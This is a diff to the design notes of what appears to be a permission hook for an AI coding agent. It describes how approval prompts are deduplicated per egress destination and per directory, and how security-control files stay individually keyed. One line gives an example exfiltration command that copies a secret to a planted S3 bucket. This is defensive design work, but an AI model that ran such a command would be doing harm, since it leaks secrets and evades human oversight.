@@ -81,7 +81,10 @@ dependency**. No ML models, no services, no Docker.
      bucket name), so `aws s3 cp <secret> s3://planted-bucket` would be silent exfil; every
      cloud upload asks once per bucket instead. Asks once **per destination** per session:
      for egress the dedup key is the host/bucket (`_egress_targets`), not the exact command,
-     so iterating upload payloads to one host asks once; other tiers key on the path/command. Keys are sha256-hashed so raw command
+     so iterating upload payloads to one host asks once; an **out-of-project write keys on
+     its parent DIRECTORY** (approve a location once — e.g. the `~/.claude` memory dir — and
+     sibling writes there don't re-nag; a security-*control* file stays keyed per-file so
+     blessing a dir can't cover a sibling kill switch); other tiers key on the path/command. Keys are sha256-hashed so raw command
      text never touches disk. **Two-phase**: PreToolUse records a target `pending`; a
      PostToolUse companion (same matcher) promotes it to `confirmed` only once the call
      actually completes AND the payload carries a `tool_response` (execution evidence —
